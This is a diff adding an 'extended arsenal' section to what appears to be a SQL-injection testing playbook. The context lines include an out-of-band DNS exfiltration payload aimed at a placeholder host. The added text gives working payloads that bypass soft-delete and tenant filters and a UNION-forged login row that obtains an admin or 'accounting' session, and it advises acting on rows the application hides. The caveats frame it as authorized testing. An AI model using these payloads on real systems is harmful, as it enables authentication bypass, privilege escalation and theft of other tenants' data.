@@ -394,3 +394,38 @@ MySQL (Windows)    : SELECT LOAD_FILE('\\\\<OOB-HOST>\\a')  /  ... INTO OUTFILE 
 ```
 Exfil form: splice `(SELECT <read-only-query>)` into the subdomain label, confirm the attributable hit, then
 STOP — never iterate real PII through DNS.
+
+---
+## Extended arsenal — application-logic exploitation (what to DO once injection is confirmed)
+
+Beyond reading tables, an injection often lets you defeat an *application* filter or fabricate a record the
+app trusts. Both are high-impact and easy to miss if you only think in "dump the DB" terms. Read-only /
+benign; prove with a bounded differential.
+
+### Soft-delete / visibility-filter bypass (read hidden, deleted, draft, or disabled rows)
+Apps "delete"/hide rows with a WHERE flag (`deletedAt IS NULL`, `is_deleted=0`, `active=1`, `status='published'`,
+`tenant_id=<me>`). The injection runs in that same WHERE, so you can neutralize the flag and read what the UI
+hides — retired products, cancelled orders, other tenants' rows, unpublished content.
+```sql
+-- reveal soft-deleted / hidden rows the app filters out:
+')) UNION SELECT id,name,description,... FROM Products WHERE deletedAt IS NOT NULL-- -
+-- or flip the app's own predicate to always-true so the filter stops hiding:
+xyz')) OR deletedAt IS NOT NULL-- -           -- (in a search that appends AND deletedAt IS NULL)
+-- generic flag bypass: ... OR is_deleted=1 -- -   ... OR 1=1 -- -   ... OR status!='x' -- -
+```
+Then act on what surfaces (e.g. order a retired product, reference a hidden id). Confirm by showing a row the
+normal UI does NOT return.
+
+### Fabricated-row authentication / privilege forge (UNION a user that does not exist)
+A login/lookup of the form `SELECT * FROM users WHERE email='<X>' AND password='<md5(pw)>'` can be made to
+return a **crafted row** via UNION — the app then issues a session for a user that was never in the DB, with
+any role you put in the row. The row must match the table's column **count and order** (enumerate first).
+```sql
+-- email field inject; password check commented out; fabricate an "accounting"/admin principal:
+' UNION SELECT 15,'name','ghost@corp.test','<any-md5>','accounting','',' ','','',1,'2024','2024',null-- -
+--      ^id  ^username ^email             ^password    ^role        ... match EVERY column of the users table
+```
+Keys: (1) comment out the rest so the real `password=` check is dropped; (2) column count/order/types must
+line up (use the UNION column-matching section above); (3) put the privileged value in the `role` column the
+app reads. Confirm by decoding the issued token/session — it carries your fabricated identity + role.
+Benign: use a throwaway fabricated identity, never impersonate a real user's row.
